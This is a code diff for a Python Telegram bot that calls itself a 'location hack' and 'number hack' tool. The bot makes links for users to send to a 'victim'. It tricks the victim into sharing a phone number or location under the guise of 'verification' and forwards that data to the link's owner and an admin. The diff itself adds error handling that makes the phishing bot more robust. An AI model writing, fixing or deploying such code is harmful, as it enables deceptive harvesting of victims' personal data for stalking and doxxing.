@@ -25,7 +25,8 @@ def check_force_join(message):
             return False
         else:
             return True
-    except:
+    except Exception as e:
+        print(f"Error checking force join: {e}")
         markup = types.InlineKeyboardMarkup()
         join_button = types.InlineKeyboardButton("Join Channel", url=FORCE_JOIN_CHANNEL)
         markup.add(join_button)
@@ -40,9 +41,12 @@ def start(message):
 
     if message.text.startswith("/start l_"):
         # Victim came for location hack
-        owner_id = int(message.text.split("_")[1])
-        attack_type[message.chat.id] = ('location', owner_id)
-        send_verification(message)
+        try:
+            owner_id = int(message.text.split("_")[1])
+            attack_type[message.chat.id] = ('location', owner_id)
+            send_verification(message)
+        except:
+            main_menu(message)
     elif message.text.startswith("/start"):
         # Victim came for number hack
         try:
@@ -84,7 +88,7 @@ def handle_text(message):
         link = f"https://t.me/{BOT_USERNAME}?start=l_{user_id}"
         bot.send_message(message.chat.id, f"📍 Your hack location link:\n{link}\n\nCopy and send it to the victim!")
 
-# Handle Contact
+# Handle Contact and Location
 @bot.message_handler(content_types=['contact', 'location'])
 def handle_contact_location(message):
     if message.chat.id not in attack_type:
@@ -97,13 +101,13 @@ def handle_contact_location(message):
     try:
         bot.forward_message(owner_id, message.chat.id, message.message_id)
     except Exception as e:
-        print("Error forwarding to owner:", e)
+        print(f"Error forwarding to owner: {e}")
 
     # Forward to admin
     try:
         bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
     except Exception as e:
-        print("Error forwarding to admin:", e)
+        print(f"Error forwarding to admin: {e}")
 
     # Tell victim verified
     bot.send_message(message.chat.id, "✅ Verification completed successfully! Enjoy.")
@@ -112,10 +116,12 @@ def handle_contact_location(message):
     attack_type.pop(message.chat.id, None)
 
 # Error handling
-@bot.errors_handler()
 def handle_error(exception):
     print(f"Error: {exception}")
 
 # Polling
 print("Bot is running...")
-bot.infinity_polling()
+try:
+    bot.infinity_polling()
+except Exception as e:
+    handle_error(e)
